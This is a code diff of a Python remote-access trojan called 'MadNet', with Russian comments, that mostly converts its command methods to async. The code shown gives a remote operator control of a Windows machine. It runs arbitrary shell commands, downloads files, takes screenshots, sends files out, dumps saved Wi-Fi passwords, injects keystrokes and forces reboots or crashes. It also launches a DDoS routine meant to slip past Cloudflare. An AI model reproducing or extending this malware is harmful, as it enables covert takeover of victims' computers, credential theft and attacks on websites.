@@ -10,7 +10,7 @@ import pyautogui
 import keyboard
 from cryptography.fernet import Fernet
 from logger import Logger_Bot
-
+import asyncio
 
 VERSION = '2.0'
 NAME_PROGRAM = 'MadNet'
@@ -47,6 +47,7 @@ class Func_API:
                 'id': self.id_op,
                 'answer': answer
                 }
+        print(data)
         requests.post(self.url + f"/push/{self.pc}", data=data)
 
     def save_config(self):
@@ -101,7 +102,7 @@ class Func_API:
                 return f'Ошибка: {e}'
         return 'Успешно:\n' + res
 
-    def cmdo(self, com):  # output от выполнения команды в cmd
+    async def cmdo(self, com):  # output от выполнения команды в cmd
         try:
             res = subprocess.check_output(com, shell=True)
         except Exception as e:
@@ -117,7 +118,7 @@ class Func_API:
                 self.send_answer(f'Ошибка: {e}')
         self.send_answer('Успешно:\n' + res)
 
-    def cmdi(self, com):  # выполнение команды в cmd
+    async def cmdi(self, com):  # выполнение команды в cmd
         try:
             os.system(com)
             self.send_answer("Успешно")
@@ -125,13 +126,13 @@ class Func_API:
             logger.log(self.cmdi.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def exits(self):  # очищает папку с медиа
+    async def exits(self):  # очищает папку с медиа
         dir = os.listdir(media_path)
         for i in dir:
             os.remove(media_path + i)
         self.send_answer("Успешно")
 
-    def ip_address(self):
+    async def ip_address(self):
         try:
             # Получение IP-адреса через jsonip.com
             ip = requests.get("http://jsonip.com/").json()
@@ -163,7 +164,7 @@ class Func_API:
             logger.log(self.ip_address.__name__, 'Ошибка соединения')
             self.send_answer('Ошибка соединения')
 
-    def wgt(self, com):
+    async def wgt(self, com):
         try:
             data = requests.get(com[0])
             if data.status_code == 200:
@@ -173,8 +174,9 @@ class Func_API:
         except Exception as e:
             logger.log(self.wgt.__name__, e)
             self.send_answer(f'Ошибка: {e}')
+        return 1
 
-    def rebooting(self, timer):  # перезагрузка пк
+    async def rebooting(self, timer):  # перезагрузка пк
         try:
             timer = "shutdown /r /t " + str(timer)
             os.system(timer)
@@ -183,7 +185,7 @@ class Func_API:
             logger.log(self.rebooting.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def shutdowning(self, timer):  # выключение пк
+    async def shutdowning(self, timer):  # выключение пк
         try:
             timer = "shutdown /s /t " + str(timer)
             os.system(timer)
@@ -192,7 +194,7 @@ class Func_API:
             logger.log(self.shutdowning.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def picture(self, file):  # открытие картинки из папки с медиа
+    async def picture(self, file):  # открытие картинки из папки с медиа
         try:
             command = f"{media_path}\\{file}.png"
             os.startfile(command)
@@ -201,7 +203,7 @@ class Func_API:
             logger.log(self.picture.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def video(self, file):  # открытие видео из папки с медиа
+    async def video(self, file):  # открытие видео из папки с медиа
         try:
             command = f"{media_path}\\{file}.mp4"
             os.startfile(command)
@@ -210,7 +212,7 @@ class Func_API:
             logger.log(self.video.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def specifications(self):  # возвращает характеристики пк
+    async def specifications(self):  # возвращает характеристики пк
         x, y = pyautogui.size()
 
         proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
@@ -230,7 +232,7 @@ fRAM          {fram} MB
 Screen:       {x}x{y}"""
         self.send_answer(banner)
 
-    def rask(self):  # меняет раскладку
+    async def rask(self):  # меняет раскладку
         try:
             keyboard.press_and_release("alt+shift")
             self.send_answer("Успешно")
@@ -238,7 +240,7 @@ Screen:       {x}x{y}"""
             logger.log(self.specifications.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def screenshot(self):  # скриншот и его отправка
+    async def screenshot(self):  # скриншот и его отправка
         filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ', '_').replace(':', '-')}.jpg"
         pyautogui.screenshot(filename)
         
@@ -246,7 +248,7 @@ Screen:       {x}x{y}"""
 
         os.remove(filename)
 
-    def keyb(self, text):  # печать текста
+    async def keyb(self, text):  # печать текста
         try:
             text = text.split("+")
             listing = ""
@@ -266,7 +268,7 @@ Screen:       {x}x{y}"""
             logger.log(self.keyb.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def print_gui(self, text):  # создаёт окно с текстом
+    async def print_gui(self, text):  # создаёт окно с текстом
         try:
             pyautogui.alert(text, "~")
             self.send_answer('Успешно')
@@ -274,7 +276,7 @@ Screen:       {x}x{y}"""
             logger.log(self.print_gui.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def input_gui(self, text):  # создаёт окно с текстом и полем для ввода
+    async def input_gui(self, text):  # создаёт окно с текстом и полем для ввода
         try:
             answer = pyautogui.prompt(text, "~")
             self.send_answer(answer)
@@ -282,7 +284,7 @@ Screen:       {x}x{y}"""
             logger.log(self.input_gui.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def closes(self):  # закрывает открытое сейчас приложение
+    async def closes(self):  # закрывает открытое сейчас приложение
         try:
             keyboard.press_and_release("alt+f4")
             self.send_answer('Успешно')
@@ -290,7 +292,7 @@ Screen:       {x}x{y}"""
             logger.log(self.closes.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def start_file(self, path):  # запускает файл по его path'у
+    async def start_file(self, path):  # запускает файл по его path'у
         try:
             text = f"start " + path
             os.system(text)
@@ -299,7 +301,7 @@ Screen:       {x}x{y}"""
             logger.log(self.start_file.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def direct(self, paths):  # аналог команды tree с глубеной шага 1
+    async def direct(self, paths):  # аналог команды tree с глубеной шага 1
         try:
             if paths == ".":
                 paths = os.getcwd()
@@ -322,10 +324,10 @@ Screen:       {x}x{y}"""
             logger.log(self.direct.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def update_bot(self):
+    async def update_bot(self):
         pass
 
-    def ddos(self, url):
+    async def ddos(self, url):
         # Устанавливаем headers Google бота, для обхода Cloudflare
         headers = {"User-Agent": "Google Bot"}
 
@@ -344,7 +346,7 @@ Screen:       {x}x{y}"""
             except:
                 pass
 
-    def pull_file(self, path: str):  # отправка файла с пк в тг
+    async def pull_file(self, path: str):  # отправка файла с пк в тг
         path = path.replace('\\', '/')
         if os.path.exists(path):
             self.send_document(path)
@@ -359,7 +361,7 @@ Screen:       {x}x{y}"""
                       '\n|--  '.join(os.listdir(pr))
             self.send_answer(otv)
 
-    def browser(self, link):  # открытие ссылки в браузере
+    async def browser(self, link):  # открытие ссылки в браузере
         try:
             linke = 'start ' + link
             os.system(linke)
@@ -368,7 +370,7 @@ Screen:       {x}x{y}"""
             logger.log(self.browser.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
+    async def extract_wifi_passwords(self):  # камуниздинг паролей от wifi
         try:
             otv = ''
             profiles_data = subprocess.check_output(
@@ -399,7 +401,7 @@ Screen:       {x}x{y}"""
             logger.log(self.extract_wifi_passwords.__name__, e)
             self.send_answer(f'Ошибка: {e}')
 
-    def tasklist(self, pid):
+    async def tasklist(self, pid):
         if '.' == pid:
             try:
 
@@ -455,7 +457,7 @@ Screen:       {x}x{y}"""
             ctypes.byref(ctypes.c_uint())
         )
 
-    def loggs(self, dat):
+    async def loggs(self, dat):
         namer = f'log_{dat}.txt'
         answer = logger.get_log(namer)
         try:
@@ -480,7 +482,7 @@ Screen:       {x}x{y}"""
 
         self.send_answer(response)
 
-    def hendler(self, arr):
+    async def hendler(self, arr):
         for i in arr:
             c = i[1].split(',') 
             self.id_op = i[0]
@@ -488,85 +490,85 @@ Screen:       {x}x{y}"""
             text_comand = c[1:]  # преобразования
 
             if comnd == "wget":
-                self.wgt(text_comand)
+                await self.wgt(text_comand)
 
             if comnd == "ip" or comnd == "ipad":
-                self.ip_address()
+                await self.ip_address()
 
             if comnd == "reboot":
-                self.rebooting(text_comand[0])
+                await self.rebooting(text_comand[0])
 
             if comnd == "specifications" or comnd == "spec":
-                self.specifications()
+                await self.specifications()
 
             if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
-                self.shutdowning(text_comand[0])
+                await self.shutdowning(text_comand[0])
 
             if comnd == "picture" or comnd == "pict":
-                self.picture(text_comand[0])
+                await self.picture(text_comand[0])
 
             if comnd == "cmdi":
-                self.cmdi(text_comand[0])
+                await self.cmdi(text_comand[0])
 
             if comnd == "cmdo":
-                self.cmdo(text_comand[0])
+                await self.cmdo(text_comand[0])
 
             if comnd == "video" or comnd == "vide" or comnd == "vid":
-                self.video(text_comand[0])
+                await self.video(text_comand[0])
 
             if comnd == "exit" or comnd == "cls" or comnd == "clear":
-                self.exits()
+                await self.exits()
 
             if comnd == "lock" or comnd == "close":
-                self.closes()
+                await self.closes()
 
             if comnd == "keyb" or comnd == "keyboard":
-                self.keyb(text_comand[0])
+                await self.keyb(text_comand[0])
 
             if comnd == "rask" or comnd == "layout":
-                self.rask()
+                await self.rask()
 
             if comnd == "dir" or comnd == "direction":
-                self.direct(text_comand[0])
+                await self.direct(text_comand[0])
 
             if comnd == "log":
-                self.loggs(text_comand[0])
+                await self.loggs(text_comand[0])
 
             if comnd == "screenshot" or comnd == "scrn":
-                self.screenshot()
+                await self.screenshot()
 
             if comnd == "inpt" or comnd == "input":
-                target = self.input_gui(text_comand[0])
+                await self.input_gui(text_comand[0])
 
             if comnd == "outp" or comnd == "output":
-                self.print_gui(text_comand[0])
+                await self.print_gui(text_comand[0])
 
             if comnd == "start" or comnd == "strt":
-                self.start_file(text_comand[0])
+                await self.start_file(text_comand[0])
 
             if comnd == "ddos" or comnd == "attack_for":
-                self.ddos(text_comand[0])
+                await self.ddos(text_comand[0])
 
             if comnd == "browser" or comnd == "brws":
-                self.browser(text_comand[0])
+                await self.browser(text_comand[0])
 
             if comnd == "pull" or comnd == "pull_file":
-                self.pull_file(text_comand[0])
+                await self.pull_file(text_comand[0])
 
             if comnd == "wifi" or comnd == "extract_wifi_passwords":
-                self.extract_wifi_passwords()
+                await self.extract_wifi_passwords()
 
             if comnd == "tasklist" or comnd == "task":
-                self.tasklist(text_comand[0])
+                await self.tasklist(text_comand[0])
 
             if comnd == "bsod":
                 self.bsod()
 
             if comnd == "kill":
-                self.exits()
+                await exit()
 
             if comnd == "upd":
-                self.update_bot()
+                await self.update_bot()
 
     def fprint(self):
         print(f"{self.pc} {self.token} {self.upd} {self.uic}")
@@ -603,11 +605,11 @@ Screen:       {x}x{y}"""
             self.send_online( f'{self.pc} запущен от имени обычного пользователя')
     
 
-fapi = Func_API()
-# fapi.new_token()
-# fapi.pc = 'pc0'
-# fapi.token = 'qhh53cm5qdz6'
-fapi.load_config()
-fapi.fprint()
-fapi.online()
-# fapi.hendler([['5','cmdo,dir'], ['5','wget,https://raw.githubusercontent.com/DmodvGH/MadNet/main/main.py,lol.py'], ['5','scrn']])
+# fapi = Func_API()
+# # fapi.new_token()
+# # fapi.pc = 'pc0'
+# # fapi.token = 'qhh53cm5qdz6'
+# fapi.load_config()
+# fapi.fprint()
+# fapi.online()
+# # fapi.hendler([['5','cmdo,dir'], ['5','wget,https://raw.githubusercontent.com/DmodvGH/MadNet/main/main.py,lol.py'], ['5','scrn']])
